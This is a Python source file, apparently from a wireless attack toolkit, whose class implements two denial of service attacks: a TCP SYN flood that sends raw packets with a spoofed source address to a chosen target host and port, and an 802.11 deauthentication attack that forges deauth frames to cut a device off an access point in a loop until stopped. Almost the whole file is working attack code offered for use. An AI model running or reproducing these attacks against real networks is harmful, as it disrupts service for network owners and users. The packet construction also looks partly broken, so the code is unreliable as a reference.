#!/usr/bin/python3

"""This module contains multiple denial of service attacks."""
from .interface_manager import InterfaceManager
from binascii import unhexlify
import socket
import time
import struct


class DenialOfService():
    """Denial of service attacks."""

    def __init__(self, interface, channel):
        """Initialize variables."""
        self.interface = interface
        self.manager = InterfaceManager(interface)
        self.manager.wlan_channel(channel)
        self.sending = False
        self.running = False

    def flood(self, target_addr, quantity, target_port=80):
        """Flood attack"""
        # set the interface to the correct mode
        self.manager.wlan_mode(InterfaceManager.MANAGED_MODE)
        # create socket
        #   AF_INET = ipv4
        #   SOCK_RAW = bypass system checks
        #   IPPROTO_TCP = tcp protocol
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        # set for custom ip header
        #   IPPROTO_TCP = tcp protocol (the socket we use)
        #   IP_HDRINCL = socket will not generate ip header (if set to 1)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        # syn flag
        flags = 1 << 1

        # construct nearly empty ip + tcp packet :
        #   big-endian (for network)
        #   ip  frame: 12B empty, 4B src_addr, 4B dst_addr
        #   tcp frame: 2B empty, 2B target_port, 9B empty, 1B flags, 6B empty
        packet = struct.pack(
            '!12x4s4s2xH9xB6x',
            socket.inet_aton('192.168.0.1'),
            socket.inet_aton(target_addr),
            target_port,
            flags)

        # send the packets
        print(f'[INFO]',
              f'Sending {quantity} TCP SYN packets',
              f'to {target_addr}:{target_port}')
        for i in range(0, quantity):
            s.sendto(packet, (target_addr, target_port))
        print(f'[INFO]',
              f'Done sending {quantity} TCP SYN packets',
              f'to {target_addr}:{target_port}')

    def deauth(self, target_addr, access_point):
        """Deauthentication attack"""
        # create socket
        #   AF_PACKET = raw packet
        #   SOCK_RAW = bypass system checks
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((self.interface, 0))

        # radio tap frame bytes
        length = b'\x08'  # empty radio tap frame is at minimum 8 bytes.

        # 802.11 frame bytes
        frame_control = b'\xc0\x00'  # deauth (subtype 12)
        addr1 = unhexlify(''.join(
            [c if (i + 1) % 3 else '' for i, c in enumerate(target_addr)]))
        addr2 = unhexlify(''.join(
            [c if (i + 1) % 3 else '' for i, c in enumerate(access_point)]))
        addr3 = unhexlify(''.join(
            [c if (i + 1) % 3 else '' for i, c in enumerate(access_point)]))

        # construct nearly empty packet:
        #   big-endian (for network)
        #   radio tap header: 2B empty, 2B length, 4B empty
        #   802.11 header: 2B control, 2B empty
        #                  6B addr1, 6B addr2, 6B addr3, 4B empty
        packet = struct.pack(
            '!2x2s4x2s2x6s6s6s4x',
            length,
            frame_control,
            addr1,
            addr2,
            addr3)

        while self.running:
            if self.sending:
                # send the packets
                print(f'[INFO]',
                      f'Sending DEAUTH packets',
                      f'to {target_addr} on AP {access_point}')
                while self.sending:
                    s.send(packet)
                print(f'[INFO]',
                      f'Done sending DEAUTH packets',
                      f'to {target_addr} on AP {access_point}')
            else:
                time.sleep(1)

    def init_deauth(self, device, ap):
        def _():
            self.running = True
            self.deauth(device, ap)
        return _

    def start(self, event):
        self.sending = True

    def stop(self, event):
        self.sending = False

    def exit_deauth(self):
        self.running = False
